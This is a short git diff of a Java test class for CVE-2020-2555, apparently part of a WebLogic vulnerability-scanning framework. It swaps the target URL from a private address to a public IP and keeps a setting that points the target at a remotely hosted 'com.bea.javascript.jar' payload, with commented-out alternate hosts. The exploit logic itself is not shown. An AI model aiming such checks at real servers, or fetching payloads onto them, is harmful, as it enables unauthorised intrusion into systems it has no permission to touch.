@@ -47,7 +47,7 @@ import static com.weblogic.framework.utils.VersionUtils.getVersion;
  * @version 1.0.0
  */
 @Authors({Authors.R4V3ZN})
-@Dependencies({":LimitFilter"})
+@Dependencies({":coherence"})
 @Versions({"12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
 public class CVE_2020_2555 implements VulTest{
 
@@ -103,11 +103,10 @@ public class CVE_2020_2555 implements VulTest{
 //        String url = "http://192.168.1.6:8080/com.bea.javascript.jar";
 //        url = "http://192.168.1.3:9999/com.bea.javascript.jar";
 //        url = "http://45.32.23.211:8080/com.bea.javascript.jar";
-        String url = "http://192.168.1.12:7001/";
+        String url = "http://123.139.243.246:8006/";
         String javascriptUrl = "http://192.168.1.6:9999/com.bea.javascript.jar";
         VulCheckParam vulCheckParam = new VulCheckParam();
         vulCheckParam.setJavascriptUrl(javascriptUrl);
-        vulCheckParam.setVersion(getVersion("192.168.1.12", 7001));
         vulCheckParam.setProtocol("iiop");
         CVE_2020_2555 vul = new CVE_2020_2555();
         System.out.println(vul.vulnerable(url, vulCheckParam));
